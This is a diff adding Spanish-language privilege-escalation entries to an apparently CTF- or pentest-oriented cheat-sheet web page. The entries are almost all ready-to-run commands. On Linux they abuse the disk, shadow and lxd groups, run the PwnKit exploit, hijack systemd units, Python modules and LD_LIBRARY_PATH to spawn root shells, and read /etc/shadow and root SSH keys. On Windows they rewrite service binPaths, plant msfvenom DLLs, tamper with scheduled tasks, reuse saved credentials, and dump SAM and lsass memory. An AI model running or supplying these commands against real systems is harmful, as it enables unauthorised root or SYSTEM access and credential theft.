@@ -173,6 +173,32 @@ const DATA = [
       ]},
       {h:"NFS no_root_squash", blocks:[
         {p:"Montar y abusar de un share NFS sin root_squash", code:`showmount -e <IP>\nmkdir /tmp/nfs\nmount -t nfs <IP>:/share /tmp/nfs -o nolock\ncp /bin/bash /tmp/nfs/bash\nchmod +s /tmp/nfs/bash\n/share/bash -p`}
+      ]},
+      {h:"Grupos peligrosos", blocks:[
+        {p:"Ver a qué grupos pertenecés", code:`id\ngroups`},
+        {p:"disk (acceso crudo al disco = leer cualquier archivo, incluido /etc/shadow)", code:`df -h                     # ver qué device es /\ndebugfs /dev/sda1\n# dentro de debugfs:\ndebugfs: cat /etc/shadow\ndebugfs: cat /root/.ssh/id_rsa`},
+        {p:"adm (leer todos los logs; a veces hay creds en los logs)", code:`find / -group adm 2>/dev/null\ncat /var/log/auth.log /var/log/syslog 2>/dev/null | grep -i pass`},
+        {p:"shadow (leer /etc/shadow y crackear el hash de root)", code:`cat /etc/shadow\n# copiar el hash de root y crackear offline\nunshadow /etc/passwd /etc/shadow > combined.txt\njohn --wordlist=rockyou.txt combined.txt`},
+        {p:"video (leer el framebuffer / capturar la pantalla)", code:`cat /dev/fb0 > /tmp/screen.raw\n# ver resolución: cat /sys/class/graphics/fb0/virtual_size`},
+        {p:"lxd / lxc (equivale a root vía montar el host en un contenedor)", code:`# subir una imagen alpine y crear un container privilegiado\nlxc image import ./alpine.tar.gz --alias priv\nlxc init priv ctr -c security.privileged=true\nlxc config device add ctr host disk source=/ path=/mnt/root recursive=true\nlxc start ctr\nlxc exec ctr /bin/sh\n# dentro: chroot /mnt/root ; ya sos root en el host`}
+      ]},
+      {h:"pkexec / polkit (PwnKit)", blocks:[
+        {p:"CVE-2021-4034 (PwnKit) — pkexec SUID, afecta casi todo 2009-2022", code:`# ¿está presente y es SUID?\nwhich pkexec\nls -la $(which pkexec)\n# compilar y correr un PoC conocido (ej. ly4k/PwnKit o berdav/CVE-2021-4034)\ngit clone https://github.com/berdav/CVE-2021-4034 ; cd CVE-2021-4034 ; make ; ./cve-2021-4034`},
+        {p:"CVE-2021-3560 (polkit) — race de dbus/polkit a root", code:`# PoC típico: lanzar dbus-send con el usuario correcto y matar en el tiempo justo\n# buscar el script PoC (secnigma / Ayrx) y seguir sus tiempos de sleep`}
+      ]},
+      {h:"Systemd / timers escribibles", blocks:[
+        {p:"Buscar unit files o timers que podés editar", code:`find / -name "*.service" -writable 2>/dev/null\nsystemctl list-timers --all\nfind / -name "*.timer" -writable 2>/dev/null`},
+        {p:"Si un .service corriendo como root es escribible", code:`# editar ExecStart para que dispare tu payload\nExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'\nsystemctl daemon-reload\nsystemctl restart <servicio>\n/tmp/rootbash -p`}
+      ]},
+      {h:"Python library hijacking", blocks:[
+        {p:"Script root que importa un módulo ubicado en un dir escribible", code:`# ver permisos del .py y de los dirs de su sys.path\npython3 -c 'import sys; print(sys.path)'\nls -la /ruta/al/modulo_importado.py`},
+        {p:"PYTHONPATH preservado vía sudo (env_keep)", code:`sudo -l   # buscar env_keep+=PYTHONPATH\n# crear un módulo malicioso con el nombre que el script importa\necho 'import os; os.setuid(0); os.system("/bin/bash")' > /tmp/<modulo>.py\nsudo PYTHONPATH=/tmp /usr/bin/<script_permitido>.py`}
+      ]},
+      {h:"Sockets de screen / tmux de root", blocks:[
+        {p:"Sesión de screen/tmux de root abierta (te adjuntás como root)", code:`# screen\nscreen -ls\nscreen -x root/<sesion>\n# tmux\nls -la /tmp/tmux-0/ 2>/dev/null\ntmux -S /tmp/tmux-0/default attach`}
+      ]},
+      {h:"Sudo con LD_LIBRARY_PATH", blocks:[
+        {p:"Si sudo -l muestra env_keep+=LD_LIBRARY_PATH", code:`# compilar una lib que secuestre una función que use el binario permitido\ncat > /tmp/lib.c << 'EOF'\n#include <stdio.h>\n#include <stdlib.h>\nstatic void hijack() __attribute__((constructor));\nvoid hijack(){ setresuid(0,0,0); system("/bin/bash -p"); }\nEOF\ngcc -fPIC -shared -o /tmp/libcustom.so.1 /tmp/lib.c\nsudo LD_LIBRARY_PATH=/tmp <comando_permitido>`}
       ]}
     ]
   },
@@ -223,6 +249,36 @@ const DATA = [
       {h:"Pass-the-Hash / Dumping de credenciales", blocks:[
         {p:"Mimikatz — dump de hashes/tickets en memoria (requiere admin)", code:`mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords\nlsadump::sam`},
         {p:"Pass-the-Hash con hash NTLM obtenido", code:`pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> //<IP> cmd.exe\nevil-winrm -i <IP> -u administrator -H <NTLM_HASH>`}
+      ]},
+      {h:"Permisos débiles de servicio (sc config)", blocks:[
+        {p:"Detectar servicios donde podés cambiar la config (SERVICE_CHANGE_CONFIG)", code:`accesschk.exe -uwcqv "Authenticated Users" * /accepteula\naccesschk.exe -uwcqv "%username%" * /accepteula\n# PowerShell (sin accesschk): PowerUp\npowershell -ep bypass\nImport-Module .\\PowerUp.ps1\nGet-ModifiableServiceFile\nGet-ServiceUnquoted`},
+        {p:"Reescribir binPath del servicio para que corra tu comando como SYSTEM", code:`sc qc <servicio>\nsc config <servicio> binpath= "C:\\Windows\\System32\\cmd.exe /c net localgroup administrators <usuario> /add"\nsc stop <servicio>\nsc start <servicio>\n# o apuntar a tu payload.exe\nsc config <servicio> binpath= "C:\\temp\\payload.exe"`},
+        {p:"Si además podés cambiar la cuenta del servicio", code:`sc config <servicio> obj= ".\\LocalSystem" password= ""`}
+      ]},
+      {h:"DLL Hijacking", blocks:[
+        {p:"Buscar servicios/apps que cargan una DLL desde un dir escribible", code:`# ver PATH y dirs escribibles en el PATH\naccesschk.exe -uvwd "Authenticated Users" C:\\ruta\\del\\servicio\\ /accepteula\n# con Procmon (en tu VM) ver NAME NOT FOUND de DLLs que busca el proceso`},
+        {p:"Generar la DLL maliciosa y dejarla con el nombre esperado", code:`msfvenom -p windows/x64/exec CMD="net localgroup administrators <usuario> /add" -f dll -o C:\\ruta\\escribible\\<nombre>.dll\n# reiniciar el servicio o la app para que cargue la DLL`}
+      ]},
+      {h:"Tareas programadas escribibles", blocks:[
+        {p:"Listar tareas y ver cuál corre como SYSTEM/Admin", code:`schtasks /query /fo LIST /v\nGet-ScheduledTask | % { $_.TaskName }\n# ver quién la corre (Run As User) y qué binario ejecuta`},
+        {p:"Si el script/binario que ejecuta la tarea es escribible", code:`icacls C:\\ruta\\al\\script.ps1\necho net localgroup administrators <usuario> /add >> C:\\ruta\\al\\script.ps1\n# esperar al próximo trigger, o si podés: schtasks /run /tn <tarea>`}
+      ]},
+      {h:"Credenciales guardadas (runas /savecred)", blocks:[
+        {p:"Ver si hay credenciales almacenadas", code:`cmdkey /list`},
+        {p:"Reusar una credencial guardada para correr algo como ese usuario", code:`runas /user:<dominio>\\<admin> /savecred "C:\\temp\\payload.exe"\nrunas /savecred /user:administrator "cmd /c net localgroup administrators <usuario> /add"`}
+      ]},
+      {h:"Archivos de instalación desatendida", blocks:[
+        {p:"Buscar Unattend / sysprep con credenciales (a veces en base64)", code:`dir /s /b C:\\Unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\System32\\Sysprep\\sysprep.xml 2>nul\ntype C:\\Windows\\Panther\\Unattend.xml | findstr /i password`},
+        {p:"Otros archivos típicos con creds", code:`dir /s /b *vnc.ini *web.config *.kdbx *.rdp 2>nul\ntype C:\\inetpub\\wwwroot\\web.config | findstr /i "connectionString password"`}
+      ]},
+      {h:"Grupos privilegiados", blocks:[
+        {p:"Ver tus grupos (algunos equivalen a admin)", code:`whoami /groups\nnet localgroup`},
+        {p:"Backup Operators (SeBackup/SeRestore → dumpear SAM+SYSTEM)", code:`reg save hklm\\sam C:\\temp\\sam.save\nreg save hklm\\system C:\\temp\\system.save\n# en Kali: secretsdump.py -sam sam.save -system system.save LOCAL`},
+        {p:"DnsAdmins (cargar una DLL arbitraria en el servicio DNS = SYSTEM)", code:`# generar DLL\nmsfvenom -p windows/x64/exec CMD="net localgroup administrators <usuario> /add" -f dll -o C:\\temp\\dns.dll\ndnscmd <servidor> /config /serverlevelplugindll C:\\temp\\dns.dll\nsc stop dns\nsc start dns`},
+        {p:"Server Operators (reconfigurar un servicio que corre como SYSTEM)", code:`sc config <servicio> binpath= "C:\\Windows\\System32\\cmd.exe /c net localgroup administrators <usuario> /add"\nsc stop <servicio>\nsc start <servicio>`}
+      ]},
+      {h:"SeDebugPrivilege", blocks:[
+        {p:"Si tenés SeDebugPrivilege (whoami /priv) → migrar/inyectar a un proceso de SYSTEM", code:`whoami /priv\n# dump de lsass sin herramientas externas (procdump)\nprocdump.exe -accepteula -ma lsass.exe C:\\temp\\lsass.dmp\n# o con PowerShell + Out-Minidump; luego parsear con mimikatz/pypykatz en Kali:\npypykatz lsa minidump C:\\temp\\lsass.dmp`}
       ]}
     ]
   },
@@ -826,3 +882,4 @@ render();
 </script>
 </body>
 </html>
+ 
